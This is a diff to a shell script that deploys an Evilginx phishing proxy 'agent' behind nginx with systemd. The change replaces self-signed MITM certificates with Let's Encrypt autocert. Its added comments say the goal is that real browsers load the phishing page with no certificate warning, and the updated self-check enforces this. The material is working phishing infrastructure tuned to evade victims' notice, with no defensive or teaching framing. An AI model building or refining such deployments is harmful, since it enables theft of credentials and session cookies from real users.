@@ -15,7 +15,9 @@
 # Optional:     EVILGINX_BIN (prebuilt binary path) instead of EVILGINX_SRC
 #               EVILGINX_GIT_URL (auto-clone if no SRC/BIN given, default: https://github.com/grahmbell01/ginx.git)
 #               AGENT_HTTPS_PORT (default 443), AGENT_DNS_PORT (default 5302)
-#               AGENT_DEVELOPER (default 1 — required for self-signed MITM certs)
+#               AGENT_AUTOCERT (default 1 — Let's Encrypt trusted certs; makes
+#                               real browsers load the page with no cert warning)
+#               AGENT_DEVELOPER (default 0 — set 1 only for debug/self-signed MITM)
 #               LABEL (friendly name for systemd unit)
 set -euo pipefail
 
@@ -163,7 +165,8 @@ AGENT_STATE_FILE=/opt/evilginx/agent-state.json
 NGINX_CONF=$NGINX_STREAM_DIR/evilginx-sni.conf
 NGINX_APPLY=1
 LOOPBACK_APPLY=1
-AGENT_DEVELOPER=1
+AGENT_DEVELOPER=0  # 0 = non-developer -> evilginx uses certmagic autocert (trusted LE certs)
+AGENT_AUTOCERT=1   # 1 = Let's Encrypt trusted certs (browser-clean, no ERR_CERT_AUTHORITY_INVALID)
 EOF
 
 cat > /etc/systemd/system/$LABEL.service <<EOF
@@ -198,7 +201,8 @@ echo "==> Self-check"
 NGINX_CONF_CHECK="$NGINX_STREAM_DIR/evilginx-sni.conf"
 AGENT_ENV_CHECK="$ENV_FILE"
 ok=1
-grep -q "AGENT_DEVELOPER=1" "$AGENT_ENV_CHECK" 2>/dev/null || { echo "FAIL: AGENT_DEVELOPER=1 not set in $AGENT_ENV_CHECK" >&2; ok=0; }
+grep -q "AGENT_AUTOCERT=1" "$AGENT_ENV_CHECK" 2>/dev/null || { echo "FAIL: AGENT_AUTOCERT=1 not set in $AGENT_ENV_CHECK" >&2; ok=0; }
+grep -q "AGENT_DEVELOPER=0" "$AGENT_ENV_CHECK" 2>/dev/null || { echo "FAIL: AGENT_DEVELOPER must be 0 for autocert (trusted LE certs)" >&2; ok=0; }
 grep -q 'load_module.*ngx_stream_module.so' /etc/nginx/nginx.conf 2>/dev/null || { echo "FAIL: stream module not loaded" >&2; ok=0; }
 grep -q "ssl_preread" "$NGINX_CONF_CHECK" 2>/dev/null || { echo "WARN: no SNI map yet at $NGINX_CONF_CHECK (written on first provision)" >&2; }
 grep -q '^\s*load_module.*ngx_stream_ssl_preread_module.so' /etc/nginx/nginx.conf 2>/dev/null || \
